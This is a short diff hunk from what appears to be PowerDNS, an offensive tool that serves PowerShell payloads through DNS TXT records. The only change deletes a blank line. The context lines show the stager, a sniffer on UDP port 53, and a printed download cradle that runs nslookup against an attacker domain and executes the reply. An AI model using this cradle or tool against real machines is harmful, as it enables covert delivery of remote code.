@@ -81,7 +81,6 @@ try:
     chunks.insert(0,STAGER_CMD)
     print("\033[1;34m[*] PowerDNS:\033[0;0m Use the following download cradle:\n\033[1;34m[*] PowerDNS:\033[0;0m powershell \"powershell (nslookup -q=txt -timeout=5 0.%s)[-1]\"" % (domain))
 
-
     while True:
 		mSniff = sniff(filter="udp dst port 53", iface=INTERFACE, prn=powerdnsHandler)
 except Exception as e:
